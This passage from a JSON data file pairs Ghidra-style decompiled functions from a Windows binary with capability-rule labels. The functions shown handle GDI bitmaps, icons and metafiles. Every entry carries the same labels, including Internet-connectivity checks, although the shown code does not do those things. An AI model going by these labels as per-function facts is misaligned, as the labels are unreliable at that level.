            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e95c(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.0041dadc();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00402c64();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.0041dd8c();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 567
    },
    "0041eaac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041eaac(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x41eac7;\n    fcn.0041e95c();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x41ead3;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x41eb49;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.0041eaac::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.0041eaac::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x41eb50, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 445
    },
    "0041eb80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041eb80(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x41eb9f;\n    fcn.00402c64();\n    puStack104 = 0x41ebae;\n    fcn.00402c64();\n    puStack104 = &fcn.0041eb80::piconinfo;\n    puStack112 = 0x41ebb8;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x41ebbd;\n    fcn.0041eb74();\n    uStack116 = 0x41ed6e;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.0041eb80::var_1h + 1;\n    fcn.0041ea40(2);\n    puStack132 = 0x41ebeb;\n    fcn.0041ea40(0x10);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x41ed47;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.0041eb80::var_1h + 1;\n    var_18h = fcn.00407ab0();\n    var_1ch = fcn.00407ab0();\n    var_20h = fcn.00407ab0();\n    var_24h = fcn.00407ab0();\n    fcn.0041eaac(2, var_1ch);\n    uVar3 = 0x10;\n    fcn.0041eaac(0x10, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.004026dc(0x41ed4e);\n    fcn.004026dc();\n    fcn.004026dc();\n    fcn.004026dc();\n    return;\n}\n",
        "token_count": 895
    },
    "0041edb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041edb4(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0041edcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041edcc(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004033e4();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "0041ee70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0041ee70(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    ulong uVar8;\n    ulong uVar9;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x0041ee95:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x41ee88;\n        iVar2 = fcn.004031a0();\n        puStack32 = 0x41ee91;\n        iVar3 = fcn.004031a0();\n        if (iVar2 != iVar3) goto code_r0x0041ee95;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x41eea5;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x41eeb0;\n        uVar4 = (**(*param_2 + 0x1c))();\n        if (uVar4 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x41eeee;\n                puVar6 = fcn.00403228();\n                uStack36 = 0x41efa7;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x41ef09;\n                puStack32 = &fcn.0041ee70::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x41ef15;\n                puVar7 = fcn.00403228();\n                uStack48 = 0x41ef8a;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.0041ee70::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar8 = (***puVar6)();\n                uVar9 = (***puVar7)();\n                if (uVar9 >> 0x20 == uVar8 >> 0x20 && uVar9 == uVar8) {\n                    (***puVar6)();\n                    cVar1 = fcn.00407bdc();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x0041ef71;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x0041ef71:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x41ef91;\n                uStack48 = 0x41ef89;\n                uVar4 = fcn.00403258();\n                return uVar4;\n            }\n            goto code_r0x0041efae;\n        }\n    }\n    puStack32 = 0x41eebb;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\ncode_r0x0041eeca:\n        uVar4 = 0;\n    }\n    else {\n        puStack32 = 0x41eec6;\n        uVar5 = (**(*param_2 + 0x1c))();\n        if (uVar5 == '\\0') goto code_r0x0041eeca;\n        uVar4 = CONCAT31(uVar5 >> 8, 1);\n    }\n    var_1h._0_1_ = uVar4;\ncode_r0x0041efae:\n    return uVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 977
    },
    "0041f014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f014(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, unaff_EBX & 0xffffff00 | arg_10h & 0xff, \n                            unaff_EBX & 0xffffff00 | arg_14h & 0xff);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0041f370": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041f370(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41f38b;\n    fcn.00404458();\n    uStack32 = 0x41f3f7;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00407c74();\n    fcn.00404040();\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00413b64();\n            fcn.004043b4();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41f3fe;\n    uStack32 = 0x41f3f6;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 305
    },
    "0041f408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041f408(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x41f486;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00413b64();\n            fcn.004031a8();\n            fcn.0040420c();\n            fcn.004043b4();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x41f48d;\n    uStack288 = 0x41f485;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 290
    },
    "0041f498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f498(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar4;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    fcn.00403fa8();\n    fcn.00403fa8();\n    var_ch = 0;\n    iVar3 = *(in_EAX + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar2 = fcn.00413b64();\n            cVar1 = fcn.00403484();\n            if ((cVar1 != '\\0') && (*(iVar2 + 4) != 0)) {\n                if (var_ch != 0) {\n                    fcn.00404270();\n                    fcn.00404270();\n                }\n                if ((*(iVar2 + 8) == 0) && (*(iVar2 + 0xc) != 0)) {\n                    fcn.00408284();\n                    fcn.00403ffc();\n                }\n                fcn.00408ccc(2);\n                uVar4 = 1;\n                fcn.00408ccc(1);\n                var_ch = var_ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    if (1 < var_ch) {\n        arg_8h_00 = 2;\n        fcn.00405b0c();\n        fcn.00408ccc(arg_8h_00);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00403fa8();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 511
    },
    "0041f7f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041f7f8(void)\n\n{\n    if (*0x4616cc == 0) {\n        *0x4616cc = fcn.0041f15c();\n    }\n    return *0x4616cc;\n}\n",
        "token_count": 58
    },
    "0041f818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0041f818(void)\n\n{\n    if (*0x4616c8 == 0) {\n        *0x4616c8 = fcn.0041f6e4();\n    }\n    return *0x4616c8;\n}\n",
        "token_count": 60
    },
    "0041fbec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fbec(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, unaff_EBX & 0xffffff00 | arg_10h & 0xff, \n                            unaff_EBX & 0xffffff00 | arg_14h & 0xff);\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0041fc14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fc14(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x41fd1b;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x41fc43;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x41fc52;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x41fc5d;\n    fcn.0040420c();\n    piStack104 = 0x41fc6a;\n    iVar1 = fcn.0041f408();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x41fc78;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x41fc9d;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x41fcbc;\n    fcn.00403258();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x41fcda;\n        iVar1 = fcn.0040346c();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x41fcf2;\n        iVar1 = fcn.0040346c();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x41fd05;\n    fcn.00403454();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x41fd22;\n    uStack96 = 0x41fd1a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 607
    },
    "0041fd88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0041fd88(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004033e4();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 267
    },
    "00420370": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00420370(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x42038b;\n    var_4h = param_2;\n    fcn.0042020c();\n    puStack172 = 0x42039b;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x4203ac;\n        iVar2 = fcn.0041e944();\n        if (iVar2 == var_eh) goto code_r0x004203b7;\n    }\n    puStack172 = 0x4203b7;\n    fcn.0041daf4();\ncode_r0x004203b7:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x4203c3;\n    lpbBuffer = fcn.004026bc();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x4204df;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00420370::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.0041daf4();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00420370::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00420370::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.0041daf4();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.004026dc(0x4204e6);\n    return;\n}\n",
        "token_count": 935
    },
    "00420644": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420644(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.0042020c();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.00420794();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00420680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420680(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.0042020c();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.00420794();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00420898": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420898(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x4208b8;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x4208c9;\n            uVar2 = fcn.004026bc();\n            uStack40 = 0x420914;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.00415a20();\n            *in_FS_OFFSET = uVar3;\n            fcn.004026dc(0x42091b);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00420924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00420924(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x420949;\n    fcn.00402c64();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = 